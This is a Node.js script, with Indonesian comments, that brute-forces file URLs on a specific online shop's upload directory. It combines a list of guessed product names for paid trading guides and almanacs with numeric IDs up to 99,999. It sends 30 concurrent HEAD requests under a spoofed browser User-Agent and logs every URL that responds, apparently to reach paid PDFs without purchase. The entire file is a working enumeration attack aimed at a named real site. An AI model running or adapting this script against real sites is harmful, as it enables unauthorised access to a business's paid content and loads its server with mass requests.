const axios = require('axios');
const fs = require('fs');

// ================= CONFIG =================
const BASE_URL = "https://graphiql.astronaccishop.com/uploads/pdf/";
const LOG_FILE = 'bruteforce_found_all.log';
const CONCURRENCY = 30; // 30 paralel
const TIMEOUT_MS = 5000;

// ================= TITLES DARI SHOP (GUESSES & EXTRACTED) =================
// Base names yang mungkin digunakan sebelum _upXXXXX.pdf atau _XXXXX.pdf
const baseNames = [
    "bitcoin_almanac_2026",
    "bitcoin_almanac_2025",
    "bitcoin_almanac_2024",
    "the_70_pips_gold_trading_system",
    "the_70_pips_gold_trading",
    "70_pips_gold_trading",
    "eye_of_future",
    "technical_analysis",
    "technical_analysis_trading",
    "elliott_wave_forecast",
    "elliott_wave_bible",
    "candlestick_mastery",
    "price_action_trading",
    "money_management",
    "trading_secrets",
    "fibonacci_trading",
    "make_money_with_astronacci",
    "jci_forecast",
    "market_outlook_2025",
    "market_outlook_2026",
    "bitcoin_trading_guide",
    "gold_trading_manual",
    "basic_trading",
    "advanced_technical_analysis",
];

// ================= UTIL =================
const delay = (ms) => new Promise(r => setTimeout(r, ms));

async function checkFile(fileName) {
    const url = `${BASE_URL}${fileName}`;
    try {
        const res = await axios.head(url, {
            timeout: TIMEOUT_MS,
            headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' }
        });

        if (res.status === 200) {
            const msg = `[FOUND] ${new Date().toISOString()} -> ${url}\n`;
            console.log('\x1b[32m%s\x1b[0m', msg.trim());
            fs.appendFileSync(LOG_FILE, msg);
            return true;
        }
    } catch (error) {
        // Ignore 404/403
    }
    return false;
}

// ================= ENGINE =================
async function runBruteForce() {
    console.log("🚀 Memulai Brute Force Lanjutan...");
    console.log(`📊 Base names: ${baseNames.length}`);
    
    // Kita coba prefix "up" dulu karena itu yang terbukti di bitcoin_almanac
    const prefixes = ["up"]; // Bisa ditambah ["up", "aa", "bb", etc] jika ingin lebih luas
    
    for (const base of baseNames) {
        console.log(`\n🔍 Scanning base: ${base}`);
        let tasks = [];
        
        // Cek ID 1 sampai 99999
        for (let id = 1; id <= 99999; id++) {
            for (const p of prefixes) {
                const fileName = `${base}_${p}${id}.pdf`;
                tasks.push(checkFile(fileName));
                
                if (tasks.length >= CONCURRENCY) {
                    await Promise.all(tasks);
                    tasks = [];
                }
            }
            
            if (id % 1000 === 0) {
                process.stdout.write(`\r   Progress ID: ${id}...`);
            }
        }
        
        if (tasks.length > 0) await Promise.all(tasks);
        console.log(`\n✅ Selesai scan untuk ${base}`);
    }
}

runBruteForce();
